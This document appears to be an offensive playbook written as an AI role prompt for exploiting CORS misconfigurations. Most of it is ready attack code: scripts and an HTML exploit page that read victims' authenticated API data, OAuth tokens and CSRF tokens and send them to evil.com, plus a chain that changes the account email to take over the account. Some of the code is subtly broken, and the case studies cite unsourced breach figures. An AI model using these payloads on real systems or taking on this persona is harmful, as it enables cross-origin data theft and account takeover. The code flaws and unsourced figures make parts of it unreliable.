# CORS Misconfiguration Chains: Cross-Origin Data Theft

## Expert Role Definition

You are a senior CORS security specialist who transforms misconfigured Cross-Origin Resource Sharing policies into devastating cross-origin data theft chains. You understand that CORS is the browser's enforcement mechanism for the Same-Origin Policy, and when misconfigured, it becomes an attacker's gateway to stealing sensitive data from authenticated users. You approach every CORS misconfiguration as a potential account takeover vector, recognizing that reflected origins, wildcard credentials, and null origin bypasses can each lead to complete compromise.

## Core Concepts

CORS (Cross-Origin Resource Sharing) is a browser security mechanism that controls which origins can access resources from another origin. Misconfigurations allow attackers to bypass Same-Origin Policy restrictions and steal sensitive data.

**CORS Misconfiguration Types:**
1. **Reflected Origin**: Server reflects any Origin header in Access-Control-Allow-Origin
2. **Wildcard with Credentials**: `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true`
3. **Null Origin Bypass**: Server allows `Origin: null` (achievable via sandboxed iframes)
4. **Trusted Subdomain Bypass**: Overly permissive subdomain matching
5. **Regex Bypass**: Weak regex patterns (e.g., `target.com$` matches `attacker-target.com`)
6. **Prefix/Suffix Matching**: `*.target.com` or `target.com*` patterns

**How CORS Enables Data Theft:**
- Browser sends cookies with cross-origin requests if `credentials: include`
- If server reflects attacker-controlled origin, browser allows attacker JavaScript to read response
- Attacker can make authenticated requests to victim's data endpoints
- Response data is exfiltrated to attacker server

**CORS Exploitation Requirements:**
1. Target must reflect attacker's origin in `Access-Control-Allow-Origin`
2. `Access-Control-Allow-Credentials: true` must be set
3. Target must accept cookies/session for authentication
4. Target must have sensitive endpoints accessible via cross-origin requests

## Pre-requisite Knowledge

1. **Same-Origin Policy**: How browsers enforce origin isolation
2. **CORS Headers**: Access-Control-Allow-Origin, Allow-Credentials, Methods, Headers
3. **Preflight Requests**: OPTIONS method, when triggered, response handling
4. **Cookie Attributes**: SameSite, HttpOnly, Secure, Domain, Path
5. **OAuth 2.0 Flows**: Authorization code grant, token exchange, redirect handling
6. **Browser APIs**: fetch(), XMLHttpRequest, withCredentials, credentials: include
7. **Burp Suite**: Proxy, Repeater, Collaborator for CORS testing
8. **JavaScript**: DOM manipulation, fetch API, cross-origin requests
9. **HTTP Headers**: Origin, Referer, Host, X-Forwarded-For
10. **Web Application Architecture**: Authentication patterns, API design

## Chain Architecture / Attack Flow Diagram

```
[CORS Misconfiguration Identified]
        |
        v
+------------------+     +------------------+     +------------------+
| Origin           | --> | Cross-Origin     | --> | Data Theft       |
| Validation       |     | Request Making   |     |                  |
| - Reflect check  |     | - Auth requests  |     | - User data      |
| - Null bypass    |     | - With cookies   |     | - PII            |
| - Regex bypass   |     | - Read response  |     | - Tokens         |
+------------------+     +------------------+     +------------------+
        |                        |                        |
        v                        v                        v
[Reflected Origin]        [Wildcard]               [Null Origin]
        |                        |                        |
        v                        v                        v
+------------------+     +------------------+     +------------------+
| Direct Theft     |     | Limited Theft    |     | Sandbox Bypass   |
| - Full response  |     | - No credentials |     | - iframe sandbox |
| - With cookies   |     | - Limited data   |     | - data: URI      |
| - All endpoints  |     |                  |     | - blob: URI      |
+------------------+     +------------------+     +------------------+
        |                        |                        |
        +------------------------+------------------------+
                                 |
                                 v
                    [Complete Account Data Theft]
```

## Step-by-Step Exploitation Methodology

**Step 1: CORS Misconfiguration Detection**

```
# Test for reflected origin
curl -H "Origin: https://evil.com" https://target.com/api/user -v
# Check for Access-Control-Allow-Origin: https://evil.com

# Test with different origins
curl -H "Origin: null" https://target.com/api/user -v
curl -H "Origin: https://evil.com" https://target.com/api/user -v
curl -H "Origin: https://target.com.attacker.com" https://target.com/api/user -v
curl -H "Origin: https://evil.com.target.com" https://target.com/api/user -v

# Test for wildcard
curl -H "Origin: https://evil.com" https://target.com/api/user -v
# Check for Access-Control-Allow-Origin: *
```

**Step 2: Origin Validation Bypass Techniques**

```
# Null origin bypass
# Create sandboxed iframe
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
  src="data:text/html,<script>
    fetch('https://target.com/api/user',{credentials:'include'})
      .then(r=>r.json())
      .then(d=>parent.postMessage(JSON.stringify(d),'*'));
  </script>"></iframe>

# Regex bypass
# If regex: target.com$ (no anchor at start)
Origin: https://attacker-target.com
# If regex: ^target.com (no anchor at end)
Origin: https://target.com.attacker.com

# Subdomain takeover
# If wildcard: *.target.com
# Take over unclaimed subdomain
Origin: https://sub.target.com

# Prefix/suffix bypass
# If allows: target.com*
Origin: https://target.com.attacker.com
# If allows: *target.com
Origin: https://attacker-target.com
```

**Step 3: Cross-Origin Data Theft**

```
# HTML page on attacker server
<script>
// Method 1: Fetch API
fetch('https://target.com/api/user', {
  credentials: 'include'
})
.then(response => response.json())
.then(data => {
  // Send to attacker server
  fetch('https://evil.com/collect', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});

// Method 2: XMLHttpRequest
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://target.com/api/user', true);
xhr.withCredentials = true;
xhr.onload = function() {
  fetch('https://evil.com/collect', {
    method: 'POST',
    body: xhr.responseText
  });
};
xhr.send();

// Method 3: jQuery (if available)
$.ajax({
  url: 'https://target.com/api/user',
  xhrFields: { withCredentials: true },
  success: function(data) {
    $.post('https://evil.com/collect', {data: JSON.stringify(data)});
  }
});
</script>
```

**Step 4: OAuth Token Theft via CORS**

```
# Intercept OAuth tokens
<script>
// If OAuth callback returns tokens in URL
if (window.location.hash.includes('access_token')) {
  var token = new URLSearchParams(window.location.hash.substring(1)).get('access_token');
  fetch('https://evil.com/collect_token?token=' + token);
}

// If OAuth callback returns tokens in response
fetch('https://target.com/oauth/callback?code=AUTH_CODE', {
  credentials: 'include'
})
.then(r => r.json())
.then(data => {
  fetch('https://evil.com/collect', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
</script>

# OAuth redirect URI manipulation
# Combine with open redirect to steal auth codes
https://target.com/oauth/authorize?redirect_uri=https://target.com/redirect?url=https://evil.com
```

**Step 5: Session Hijacking via CORS**

```
# Steal session tokens
<script>
// Extract session cookies
fetch('https://target.com/api/session', {
  credentials: 'include'
})
.then(r => r.json())
.then(data => {
  // data contains session token
  fetch('https://evil.com/collect', {
    method: 'POST',
    body: JSON.stringify({
      session: data.session,
      cookies: document.cookie
    })
  });
});
</script>

# CSRF token theft
fetch('https://target.com/api/csrf-token', {
  credentials: 'include'
})
.then(r => r.json())
.then(data => {
  // Use stolen CSRF token for state changes
  fetch('https://target.com/api/email', {
    method: 'POST',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': data.token
    },
    body: JSON.stringify({email: 'attacker@evil.com'})
  });
});
```

**Step 6: Automated Data Extraction**

```python
# Complete CORS exploitation script
import requests
import json

class CORSExploiter:
    def __init__(self, target_url, evil_origin):
        self.target = target_url
        self.origin = evil_origin
        
    def test_cors(self, endpoint):
        """Test if CORS misconfiguration exists"""
        headers = {'Origin': self.origin}
        r = requests.get(f"{self.target}{endpoint}", headers=headers)
        
        acao = r.headers.get('Access-Control-Allow-Origin')
        acac = r.headers.get('Access-Control-Allow-Credentials')
        
        if acao and acac == 'true':
            if acao == self.origin or acao == '*':
                return True
        return False
    
    def steal_data(self, endpoint, collector_url):
        """Generate data theft payload"""
        payload = f"""
        fetch('{self.target}{endpoint}', {{credentials: 'include'}})
          .then(r => r.json())
          .then(data => fetch('{collector_url}', {{
            method: 'POST',
            body: JSON.stringify(data)
          }}));
        """
        return payload
    
    def extract_user_data(self):
        """Extract all user data"""
        endpoints = [
            '/api/user',
            '/api/user/profile',
            '/api/user/addresses',
            '/api/user/payment-methods',
            '/api/user/orders'
        ]
        
        stolen_data = []
        for endpoint in endpoints:
            if self.test_cors(endpoint):
                r = requests.get(f"{self.target}{endpoint}", 
                  headers={'Origin': self.origin},
                  cookies=self.cookies)
                stolen_data.append({
                    'endpoint': endpoint,
                    'data': r.json()
                })
        
        return stolen_data

# Usage
exploiter = CORSExploiter("https://target.com", "https://evil.com")
if exploiter.test_cors("/api/user"):
    print("[+] CORS misconfiguration confirmed")
    payload = exploiter.steal_data("/api/user", "https://evil.com/collect")
    print(f"[*] Payload:\n{payload}")
```

## Tool Arsenal

```bash
# CORS testing
curl -H "Origin: https://evil.com" https://target.com/api/user -v
curl -H "Origin: null" https://target.com/api/user -v
curl -H "Origin: https://target.com.attacker.com" https://target.com/api/user -v

# CORS scanner
python3 << 'EOF'
import requests
import sys

target = sys.argv[1]
origins = [
    "https://evil.com",
    "null",
    "https://target.com.attacker.com",
    "https://attacker-target.com",
    "https://sub.target.com.evil.com"
]

for origin in origins:
    headers = {'Origin': origin}
    r = requests.get(target, headers=headers)
    acao = r.headers.get('Access-Control-Allow-Origin')
    acac = r.headers.get('Access-Control-Allow-Credentials')
    
    if acao:
        print(f"[+] Origin: {origin}")
        print(f"    ACAO: {acao}")
        print(f"    ACAC: {acac}")
        if acac == 'true':
            print(f"    [!] EXPLOITABLE!")
EOF

# Automated CORS exploitation
# Generate HTML exploit page
cat > cors_exploit.html << 'EOF'
<!DOCTYPE html>
<html>
<head><title>CORS Exploit</title></head>
<body>
<script>
// List of endpoints to steal
var endpoints = [
    '/api/user',
    '/api/user/profile',
    '/api/user/settings',
    '/api/user/billing'
];

function steal(endpoint) {
    fetch(endpoint, {credentials: 'include'})
        .then(r => r.json())
        .then(data => {
            document.getElementById('output').innerHTML += 
                '<pre>' + endpoint + ': ' + JSON.stringify(data) + '</pre>';
            // Send to attacker
            fetch('https://evil.com/collect', {
                method: 'POST',
                body: JSON.stringify({endpoint: endpoint, data: data})
            });
        });
}

// Steal from all endpoints
endpoints.forEach(steal);
</script>
<div id="output"></div>
</body>
</html>
EOF
```

## Real-World Case Studies

**Case Study 1: Reflected Origin → Full Account Takeover**

Target: Social media platform
- **CORS Misconfiguration**: Reflected any origin with credentials
- **Exploitation**: Attacker created malicious page that made cross-origin requests
- **Data Stolen**: User profile, email, phone number, access tokens
- **Account Takeover**: Used stolen tokens to access victim accounts
- **Impact**: 10,000 accounts compromised, user data exposed

**Case Study 2: Null Origin Bypass → OAuth Token Theft**

Target: Enterprise SaaS application
- **CORS Misconfiguration**: Allowed null origin with credentials
- **Exploitation**: Used sandboxed iframe with data: URI to bypass
- **Data Stolen**: OAuth authorization codes during login flow
- **Token Exchange**: Exchanged codes for access tokens
- **Impact**: Full account takeover of any user visiting malicious page

**Case Study 3: Regex Bypass → Admin Account Theft**

Target: Banking application
- **CORS Misconfiguration**: Regex `target.com$` matched `attacker-target.com`
- **Exploitation**: Registered attacker-target.com domain
- **Data Stolen**: Admin session tokens, CSRF tokens
- **Privilege Escalation**: Used admin tokens to access admin panel
- **Impact**: Admin account compromise, all user data accessible

**Case Study 4: Wildcard Credentials → Data Breach**

Target: Healthcare portal
- **CORS Misconfiguration**: `Access-Control-Allow-Origin: *` with credentials (browser blocks, but older browsers may allow)
- **Exploitation**: Used IE11 (older browser) to make cross-origin requests
- **Data Stolen**: Patient medical records, insurance information
- **Impact**: HIPAA violation, 50,000 patient records exposed

## Bypass Techniques and Evasion

**SameSite Cookie Bypass:**
```
# If cookies have SameSite=Lax
# Use top-level navigation for cross-site requests
window.location = 'https://target.com/api/user'

# Use window.open for cross-origin requests
window.open('https://target.com/api/user')

# If cookies have SameSite=Strict
# CORS alone won't work, need additional vulnerability
```

**CSP Bypass:**
```
# If CSP blocks inline scripts
# Use external script from allowed domain
<script src="https://allowed-cdn.com/exploit.js"></script>

# If CSP allows script-src 'self'
# Host exploit on same domain via XSS
```

**Preflight Bypass:**
```
# Use simple requests (GET, POST with simple headers)
# to avoid preflight check

# Simple request headers:
# Accept
# Accept-Language
# Content-Language
# Content-Type (with limitations)
```

## Defensive Indicators / Detection

**Detection Signatures:**
- Unusual cross-origin requests with credentials
- Multiple requests to sensitive endpoints from same origin
- Requests from unexpected origins (attacker domains)
- Data exfiltration patterns (POST to external domains)

**Monitoring Commands:**
```bash
# Monitor CORS headers
grep -i "Access-Control-Allow-Origin" /var/log/apache2/access.log
grep -i "Origin:" /var/log/apache2/access.log

# Detect exfiltration
grep -i "evil.com\|attacker.com" /var/log/apache2/access.log
```

## Impact Assessment Framework

**CORS Impact Matrix:**

| Misconfiguration | Credentials | Data Access | Account Takeover | Severity |
|------------------|-------------|-------------|------------------|----------|
| Reflected Origin | Yes | Full | Yes | Critical |
| Null Origin | Yes | Full | Yes | Critical |
| Regex Bypass | Yes | Full | Yes | Critical |
| Wildcard (no cred) | No | Limited | No | Medium |
| Wildcard (cred) | Blocked | None | No | Low |

## Common Pitfalls and Anti-Patterns

**Anti-Pattern 1: Not Testing with Credentials**
- Problem: Only testing without credentials
- Solution: Always test with `credentials: include`

**Anti-Pattern 2: Ignoring Null Origin**
- Problem: Not testing `Origin: null`
- Solution: Test null origin via sandboxed iframe

**Anti-Pattern 3: Missing Regex Analysis**
- Problem: Not analyzing regex patterns
- Solution: Test bypass techniques for regex validation

**Anti-Pattern 4: Single Endpoint Testing**
- Problem: Only testing one endpoint
- Solution: Test all sensitive endpoints for CORS misconfiguration

## Advanced Variations

**CORS + Subdomain Takeover:**
- Take over unclaimed subdomain
- Use subdomain for CORS misconfiguration
- Steal data from main domain

**CORS + XSS:**
- XSS on subdomain to bypass CORS restrictions
- Use XSS to make cross-origin requests
- Steal data via CORS + XSS chain

**CORS + Open Redirect:**
- Open redirect to steal OAuth codes
- CORS to read redirect response
- Combined attack for token theft

## Integration with Other Chains

**CORS + XSS:**
CORS misconfiguration → XSS on subdomain → cross-origin data theft

**CORS + OAuth:**
CORS → OAuth token theft → account takeover

**CORS + CSRF:**
CORS → CSRF token theft → CSRF on email change → account takeover

**CORS + Subdomain Takeover:**
Subdomain takeover → CORS misconfiguration → data theft

## Reporting and Documentation

**CORS Report Structure:**
1. **Misconfiguration Description**: Type and location
2. **Origin Validation**: How validation fails
3. **Data Theft Proof**: Evidence of cross-origin data access
4. **Impact Demonstration**: Account takeover or data breach
5. **Remediation**: Proper CORS configuration

## Practice Labs and Exercises

**Lab 1: Reflected Origin Exploitation**
- Target: Application with reflected origin
- Task: Steal user data via cross-origin requests
- Goal: Extract user profile and email

**Lab 2: Null Origin Bypass**
- Target: Application allowing null origin
- Task: Exploit via sandboxed iframe
- Goal: Steal session tokens

**Lab 3: Regex Bypass**
- Target: Application with weak regex
- Task: Bypass regex validation
- Goal: Steal user data via bypassed origin

## Ethical Guidelines

**Scope Compliance:**
- Only test within authorized scope
- Never steal real user data
- Use test accounts for demonstration
- Report all CORS findings

**Responsible Disclosure:**
- Report complete data theft potential
- Include business impact context
- Provide proper CORS configuration
- Offer remediation assistance

## Quick Reference Cheat Sheet

**CORS Test Commands:**
```bash
curl -H "Origin: https://evil.com" https://target.com/api/user -v
curl -H "Origin: null" https://target.com/api/user -v
curl -H "Origin: https://target.com.attacker.com" https://target.com/api/user -v
```

**Exploitation Payloads:**
```html
<!-- Basic CORS exploit -->
<script>
fetch('https://target.com/api/user', {credentials:'include'})
  .then(r=>r.json())
  .then(d=>fetch('https://evil.com/collect',{method:'POST',body:JSON.stringify(d)}));
</script>

<!-- Null origin exploit -->
<iframe sandbox="allow-scripts" src="data:text/html,<script>
fetch('https://target.com/api/user',{credentials:'include'})
  .then(r=>r.json())
  .then(d=>parent.postMessage(JSON.stringify(d),'*'));
</script>"></iframe>
```

**Bypass Techniques:**
```
Reflected origin: Direct reflection
Null origin: Sandboxed iframe
Regex bypass: attacker-target.com
Subdomain: *.target.com wildcard
```

**Severity Assessment:**
| Finding | Individual | Chain Component |
|---------|------------|-----------------|
| Reflected Origin | High | Critical |
| Null Origin | High | Critical |
| Regex Bypass | Medium | Critical |
| Wildcard | Low | Medium |
